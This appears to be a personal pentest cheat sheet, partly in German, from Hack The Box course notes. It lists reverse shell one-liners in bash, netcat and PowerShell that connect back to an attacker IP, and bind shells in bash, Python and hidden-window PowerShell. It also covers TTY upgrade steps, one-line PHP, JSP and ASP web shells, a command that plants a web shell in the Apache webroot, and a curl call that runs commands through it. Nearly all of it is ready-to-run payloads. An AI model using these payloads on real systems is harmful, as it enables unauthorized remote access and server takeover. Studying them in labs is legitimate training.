# Reverse Shell

1. start `netcat` listener on a port of your choice
 ```
 nc -lvnp 1234
```

| Flag | Description                                                    |
| ---- | -------------------------------------------------------------- |
| `-l` | `Listen mode, to wait for a connection to connect to us.`      |
| `-v` | `Verbose mode, so that we know when we receive a connection.`  |
| `-n` | `Disable DNS Resolution and only connect via IPs, to speed up` |
| `-p` | `Port` netcat should be listening from                         |
2. Get your `own IP` to be able to send the connection to you (IP in tun0)
```
ip a
```

3.  Reverse Shell command for Linux, 2 options
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

3. Reverse Shell command for Powershell Windows
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```


# Bind Shell
Eine **Bind Shell** bedeutet, dass du auf einem entfernten Rechner eine Shell öffnest und sie an einen bestimmten Port bindest, sodass du dich von einem anderen Rechner aus damit verbinden kannst. Das bedeutet, dass der entfernte Rechner selbst als Server agiert, auf dem ein Listener läuft.

- IP 0.0.0.0 bedeutet, dass die Shell auf **allen** verfügbaren Netzwerk-Interfaces lauscht (also nicht nur auf einer bestimmten IP).
#### Commands to start a Bind Shell:
Bash:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
Python
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
Powershell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

#### Connect to the Bindshell
```shell-session
nc 10.10.10.1 1234
```

## To be able to access the command history in a Shell we need to upgrade our TTY

1. upgrade the type of our shell to a full TTY
```shell-session
python -c 'import pty; pty.spawn("/bin/bash")'
```
2. After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:
```shell-session
www-data@remotehost$ ^Z

Hussware0@htb[/htb]$ stty raw -echo
Hussware0@htb[/htb]$ fg
```
3. Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.

# Web Shell
A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page.

#### Web Shell Skript:


php
```php
<?php system($_REQUEST["cmd"]); ?>
```
jsp
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
asp
```asp
<% eval request("cmd") %>
```

#### Damir die Webshell funktioniert muss sie ins `Webroot-Verzeichnis` des Servers gespeichert sein, damit sie über den browser aufgerufen werden kann.  Z.b. kannst dud as Skript über eine Upload funktion hochladen.

|Web Server|Default Webroot|
|---|---|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|
Wenn du `RCE` hast, kannst du direkt ins Verzeichnis schreiben zb auf einen Linux Host running apache:
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

### Access your web shell

Over the browser:
![](CPTS/img/8ddc2f302e9bc18aea6a03765cdd10f0_MD5.jpeg)

Via curl:
```shell-session
curl http://SERVER_IP:PORT/shell.php?cmd=id
```
